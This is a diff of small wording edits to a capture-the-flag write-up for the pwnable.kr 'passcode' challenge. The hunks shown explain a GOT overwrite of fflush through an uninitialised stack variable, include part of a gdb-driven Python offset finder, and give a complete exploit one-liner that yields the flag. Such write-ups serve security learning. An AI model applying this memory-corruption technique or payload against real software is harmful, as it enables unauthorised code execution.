@@ -67,7 +67,7 @@ My initial C code was compiled without any error!
 Well, there was some compiler warning, but who cares about that?
 ```
 
-If we download the code off of the `pwnable` machine (just so it's more convenient to run tools on our local machine; alternatively, you could create a folder ad do work in `/tmp` using what's available on the `pwnable` machine), we can get some indication as to what those warnings were.
+If we download the code off of the `pwnable` machine (just so it's more convenient to run tools on our local machine; alternatively, you could create a folder and do work in `/tmp` using what's available on the `pwnable` machine), we can get some indication as to what those warnings were.
 
 ```
 $ scp -P2222 passcode@pwnable.kr:passcode .
@@ -171,7 +171,7 @@ Dump of assembler code for function fflush@plt:
 
 So, we just need to modify `0x804a004` to be the address in `login` we want to return to. Now, we just need to figure out what part of `name` overlaps with `passcode1`. There are many ways to do it (read the disassembly and manually look at the stack frames, guess and check (using gdb), etc...), but I'll do a cute solution that uses `python` to do a binary search using `gdb`.
 
-First, note that in a dynamic analysis, we can get the value of `passcode1` by looking at `-0x10(%ebp)` at `0x804858b`.
+First, note that in a dynamic analysis, we can get the value of `passcode1` by looking at `-0x10(%ebp)` at `0x804858b` (or really anywhere after we `mov %esp, %ebp` in `login`).
 
 ```
  804857c:       8b 55 f0                mov    -0x10(%ebp),%edx
@@ -181,7 +181,7 @@ First, note that in a dynamic analysis, we can get the value of `passcode1` by l
  804858b:       a1 2c a0 04 08          mov    0x804a02c,%eax
 ```
 
-```python3
+```python
 # Saved as find.py
 import subprocess
 
@@ -223,7 +223,7 @@ $ python3 find.py
 Overwritten completely at 100 a's
 ```
 
-Which, to be fair, is probably what one would guess if they had one guess. But, this gives us everything we need for the exploit: we can use name to set `passcode1` to 0x804a004 and then write the value 0x80485d7 = 134514135 to it. Using a really long one-liner: `python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 96 + 0x804a004.to_bytes(4, "little") + b"\n134514135\n")' | ./passcode`, we obtain the flag.
+Which, to be fair, is probably what one would guess if they had one guess. But, this gives us everything we need for the exploit: we can use name to set `passcode1` to 0x804a004 and then write the value 0x80485d7 = 134514135 to it. Using a long one-liner: `python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 96 + 0x804a004.to_bytes(4, "little") + b"\n134514135\n")' | ./passcode`, we obtain the flag.
 
 To expand upon later:
 
